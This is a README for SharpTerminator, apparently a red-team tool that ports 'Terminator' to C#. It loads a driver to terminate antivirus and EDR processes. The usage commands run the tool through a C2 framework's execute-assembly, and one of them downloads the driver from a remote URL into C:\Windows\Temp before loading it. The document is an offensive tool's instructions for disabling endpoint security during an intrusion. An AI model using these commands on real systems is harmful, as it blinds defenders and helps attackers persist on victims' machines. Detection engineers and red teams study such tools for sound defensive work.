# SharpTerminator

C# port of ZeroMemoryEx's Terminator, so all hail goes to him.

# Usage

You can download the driver from a remote URL using SharpTerminator and load it to terminate AV/EDR processes, or you can directly load it to the disk to perform the same operation.

When using Remote URL, the driver is downloaded to "C:\Windows\Temp" and then loaded from there.

In fact, there is no difference between them; if you don't want to use the upload function in your C2, you can use the other one.

Loading from remote url:
```
execute-assembly SharpTerminator.exe --url "http://remoteurl.com:80/Terminator.sys"
```
Loading from disk:
```
execute-assembly SharpTerminator.exe --disk "C:\path\to\driver\Terminator.sys"
```


### Download driver from remote url and terminate AV/EDR:
![image](![image](https://github.com/mertdas/SharpTerminator/assets/48562581/6c13552b-6bc2-4b3f-8af4-e70f0952ec9b))

### Load driver from disk and terminate AV/EDR:

![image](https://github.com/mertdas/SharpTerminator/assets/48562581/232b67b0-f5c6-44cc-936d-d6acdb617a74)

# Credit
ZeroMemoryEx https://github.com/ZeroMemoryEx/Terminator<br>
Spyboy :)

